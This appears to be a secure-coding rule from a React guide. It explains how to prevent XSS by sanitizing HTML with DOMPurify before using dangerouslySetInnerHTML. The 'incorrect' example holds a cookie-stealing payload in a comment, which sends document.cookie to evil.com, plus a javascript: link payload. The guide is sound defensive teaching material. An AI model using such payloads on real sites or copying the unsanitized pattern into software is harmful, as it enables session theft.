---
title: Sanitize All User Inputs Before Rendering
impact: CRITICAL
impactDescription: Prevents stored and reflected XSS — unsanitized HTML can steal sessions and exfiltrate data
tags: security, xss, sanitization, dangerouslySetInnerHTML, DOMPurify
---

## Sanitize All User Inputs Before Rendering

React's JSX escapes text content by default, but `dangerouslySetInnerHTML` bypasses this protection entirely. Any user-provided HTML rendered through it — comments, rich text, markdown — can execute arbitrary JavaScript. Always sanitize HTML before rendering.

**Incorrect (unsanitized HTML — XSS payload executes):**

```typescript
// components/Comment.tsx
interface CommentProps {
  content: string // User-provided HTML from API
}

function Comment({ content }: CommentProps) {
  // If content contains <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">,
  // the script runs immediately when rendered.
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// components/MarkdownPreview.tsx
import { marked } from 'marked'

function MarkdownPreview({ markdown }: { markdown: string }) {
  // marked() converts markdown to HTML but does not sanitize it.
  // Input like [click](javascript:alert('xss')) becomes executable.
  const html = marked(markdown)
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

**Correct (sanitized with DOMPurify — malicious tags stripped):**

```typescript
// lib/sanitize.ts
import DOMPurify from 'dompurify'

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre', 'blockquote']
const ALLOWED_ATTR = ['href', 'title', 'target', 'rel']

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,
  })
}

// Force all links to open safely
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})
```

```typescript
// components/Comment.tsx
import { sanitizeHtml } from '~/lib/sanitize'

interface CommentProps {
  content: string
}

function Comment({ content }: CommentProps) {
  return <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(content) }} />
}

// components/MarkdownPreview.tsx
import { marked } from 'marked'
import { sanitizeHtml } from '~/lib/sanitize'

function MarkdownPreview({ markdown }: { markdown: string }) {
  const html = marked(markdown) as string
  return <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(html) }} />
}
```

When you do not need HTML rendering at all, avoid `dangerouslySetInnerHTML` entirely. React's default JSX escaping is sufficient for plain text:

```typescript
// Safe — React escapes the text content automatically
function Comment({ content }: { content: string }) {
  return <p>{content}</p>
}
```

Server-side validation is required. Sanitize on the server before storage as well — client-side sanitization is a defense-in-depth measure, not a replacement for server-side filtering.
